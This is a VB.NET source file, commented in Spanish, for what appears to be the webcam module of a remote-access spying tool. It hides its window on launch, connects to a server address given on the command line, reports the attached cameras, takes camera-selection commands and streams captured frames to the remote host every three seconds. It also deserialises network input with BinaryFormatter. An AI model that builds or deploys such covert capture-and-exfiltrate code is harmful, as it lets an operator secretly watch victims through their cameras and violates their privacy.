Imports System.Drawing.Imaging
Imports AForge.Video
Imports AForge.Video.DirectShow
Imports System.Net.Sockets
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.IO
Public Class Main
    Dim isWebCamActive As Boolean = False
    Dim ServerIP As String ' = "localhost"
    Dim ServerPort As Integer ' = 15243

    Dim YO As New TcpClient
    Dim NS As NetworkStream
    Dim threadSender As Threading.Thread
    Dim threadReceiver As Threading.Thread
    Dim threadResponse As Threading.Thread
    Dim envioMensaje As String
    Public Sub New()
        ' Esta llamada es exigida por el diseñador.
        InitializeComponent()
        ' Agregue cualquier inicialización después de la llamada a InitializeComponent().
        VideoDevice = New FilterInfoCollection(FilterCategory.VideoInputDevice)
    End Sub

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        CheckForIllegalCrossThreadCalls = False
        StartUp.Init()
        ReadParameters()
        StartCamStreaming()
    End Sub

    Sub ReadParameters()
        Try
            If My.Application.CommandLineArgs.Count = 0 Then
                End
            Else
                For i As Integer = 0 To My.Application.CommandLineArgs.Count - 1
                    Dim parameter As String = My.Application.CommandLineArgs(i)
                    If parameter.ToLower Like "*--serverip*" Then
                        Dim args As String() = parameter.Split("-")
                        ServerIP = args(3)
                    ElseIf parameter.ToLower Like "*--serverport*" Then
                        Dim args As String() = parameter.Split("-")
                        ServerPort = Integer.Parse(args(3))
                    End If
                Next
            End If
        Catch ex As Exception
            AddToLog("ReadParameters@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub StartCamStreaming()
        Try
            If Not isWebCamActive Then
                YO.Connect(ServerIP, ServerPort)
                envioMensaje = "[CameraList]" & GetCameras()
                threadReceiver = New Threading.Thread(AddressOf ReceiveMessages)
                threadReceiver.Start()
                threadResponse = New Threading.Thread(AddressOf SendMessages)
                threadResponse.Start()
                isWebCamActive = True
            End If
        Catch ex As Exception
            AddToLog("StartCamStreaming@Main", "Error: " & ex.Message, True)
            End
        End Try
    End Sub
    Sub StopCamStreaming()
        Try
            If isWebCamActive = True Then
                threadReceiver.Abort()
                threadSender.Abort()
                isWebCamActive = False
            End If
        Catch ex As Exception
            AddToLog("StopCamStreaming@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Dim Camarita As VideoCaptureDevice
    Dim VideoDevice As FilterInfoCollection
    Dim BMP As Bitmap
    Dim WebCameras As New ArrayList
    Dim usingCamera As Integer
    Function GetCameras() As String
        Try
            WebCameras.Clear()
            Dim contenido As String = Nothing
            Dim usingIndex As Integer = 0
            For Each vid As FilterInfo In VideoDevice
                Dim content As String = vid.Name
                WebCameras.Add(content)
                contenido &= content & "|"
                usingIndex += 1
            Next
            Return contenido
        Catch ex As Exception
            Return AddToLog("GetCameras@Main", "Error: " & ex.Message, True)
        End Try
    End Function
    Function CameraManager(Optional ByVal camIndex As SByte = 0) As String
        Try
            If isWebCamActive Then
                usingCamera = camIndex
                Camarita = New VideoCaptureDevice(VideoDevice(camIndex).MonikerString)
                AddHandler Camarita.NewFrame, New NewFrameEventHandler(AddressOf Capturando)
                Camarita.Start()
                threadSender = New Threading.Thread(AddressOf SendPicture)
                threadSender.Start()
            Else
                Try
                    Camarita.Stop()
                Catch
                End Try
            End If
            Return "Camera '" & WebCameras(usingCamera).ToString.Split("|")(1) & "' (" & usingCamera & ") is now " & isWebCamActive
        Catch ex As Exception
            Return AddToLog("CameraManager@Main", "Error: " & ex.Message, True)
        End Try
    End Function
    Private Sub Capturando(sender As Object, eventArgs As NewFrameEventArgs)
        BMP = DirectCast(eventArgs.Frame.Clone(), Bitmap)
    End Sub

    Sub SendPicture()
        Dim BF As New BinaryFormatter
        Dim MS As New MemoryStream
        While True
            Try
                'Dim MS As New MemoryStream
                BMP.Save(MS, Imaging.ImageFormat.Png)
                BMP = Image.FromStream(MS)
                NS = YO.GetStream
                BF.Serialize(NS, BMP)
                Threading.Thread.Sleep(3000) '3 sec
            Catch ex As Exception
                AddToLog("SendPicture@Main", "Error: " & ex.Message, True)
            End Try
        End While
    End Sub

    Sub ReceiveMessages()
        Dim BF As New BinaryFormatter
        While True
            Try
                NS = YO.GetStream
                If NS.DataAvailable Then
                    ProcesarComando(System.Text.Encoding.UTF7.GetString(BF.Deserialize(NS)))
                End If
                Threading.Thread.Sleep(3000) '3 sec
            Catch ex As Exception
                AddToLog("ReceiveMessages@Main", "Error: " & ex.Message, True)
            End Try
        End While
    End Sub

    Sub ProcesarComando(ByVal mensaje As String)
        Try
            If mensaje.StartsWith("[CameraSelect]") Then
                CameraManager(mensaje.Replace("[CameraSelect]", Nothing))
            ElseIf mensaje.StartsWith("[..]") Then

            End If
        Catch ex As Exception
            AddToLog("ORDENES@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub SendMessages()
        Dim BF As New BinaryFormatter
        While True
            Try
                If NS IsNot Nothing Then
                    NS = YO.GetStream
                    If envioMensaje IsNot Nothing Then
                        BF.Serialize(NS, System.Text.Encoding.UTF7.GetBytes(envioMensaje))
                        envioMensaje = Nothing
                    End If
                End If
                Threading.Thread.Sleep(3000) '3 sec
            Catch ex As Exception
                AddToLog("SendMessages@Main", "Error: " & ex.Message, True)
            End Try
        End While
    End Sub
End Class
'el mensaje CameraList no se envia bien (?)